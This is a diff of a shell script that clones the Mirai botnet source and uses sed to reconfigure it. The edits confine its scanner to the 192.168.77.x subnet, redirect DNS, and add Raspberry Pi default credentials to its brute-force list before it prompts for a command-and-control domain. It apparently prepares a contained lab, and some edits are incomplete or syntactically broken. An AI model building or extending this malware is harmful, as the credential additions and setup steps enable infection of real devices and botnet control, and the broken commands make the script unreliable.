@@ -65,12 +65,17 @@ cd
 git clone https://github.com/jgamblin/Mirai-Source-Code
 cd Mirai-Source-Code/mirai
 
-#TODO:
-# mirai/bot/scanner.c contains list of ip’s (ipv4_t get_random_ip(void);. 
-# This was modified to only parse 192.168.66 ips. 
+# mirai/bot/scanner.c contains list of ip’s (ipv4_t get_random_ip(void); - delete them. 
+sed -i -e '/ while (o1 == 127 /,+13d' ~/mirai/Mirai-Source-Code/mirai/bot/scanner.c
+// still have to erase do {}
 
-# change dns server to 127.0.0.1 in mirai/bot/resolv.c 
-sed -i -e 's/addr.sin_addr.s_addr = INET_ADDR(8,8,8,8);/addr.sin_addr.s_addr = INET_ADDR(127,0,0,1);/g' ~/mirai/Mirai-Source-Code/mirai/bot/resolv.c
+#TODO:
+# replace pi\/raspberry with smth like add_auth_entry("\x4F\x4D\x56\x4A\x47\x50", "\x44\x57\x41\x49\x47\x50", 1);
+sed -i '/add_auth_entry("\x4F\x4D\x56\x4A\x47\x50", "\x44\x57\x41\x49\x47\x50", 1); \/\/ mother   fucker/a "here goes the pi\/raspberry passwd"'  ~/mirai/Mirai-Source-Code/mirai/bot/scanner.c
+sed -i -e 's/return INET_ADDR(o1,o2,o3,o4);/return INET_ADDR(192,168,77,o4);/g' ~/mirai/Mirai-Source-Code/mirai/bot/scanner.c
+
+# change dns server to the ip of the AP (interface to rest of clients) in mirai/bot/resolv.c 
+sed -i -e 's/addr.sin_addr.s_addr = INET_ADDR(8,8,8,8);/addr.sin_addr.s_addr = INET_ADDR(192,168,77,1);/g' ~/mirai/Mirai-Source-Code/mirai/bot/resolv.c
 
 echo -e "Please give the domain name of the CNC"
 read $domainname 
